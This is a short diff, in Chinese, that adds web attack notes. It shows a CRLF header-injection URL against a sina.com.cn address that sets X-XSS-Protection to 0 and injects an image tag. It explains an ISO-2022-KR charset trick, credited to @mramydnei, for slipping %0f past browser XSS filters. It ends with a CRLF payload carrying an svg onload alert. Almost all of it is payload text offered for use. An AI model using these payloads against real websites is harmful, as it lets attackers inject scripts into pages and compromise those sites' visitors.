@@ -1,0 +1,6 @@
+http://xxx.sina.com.cn/?url=%0aX-XSS-Protection:0%0a%0d%0a%0d%3Cimg%20src=1%3E
+注入一个X-XSS-Protection:0到数据包中，绕过浏览器策略。
+
+@mramydnei 还想到了一个利用字符编码来绕过XSS Filter的方法，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个<meta charset=ISO-2022-KR>：
+
+%0a%0dX-XSS-Protection: 0%0a%0d%0a%0d<svg\onload=alert(110)>
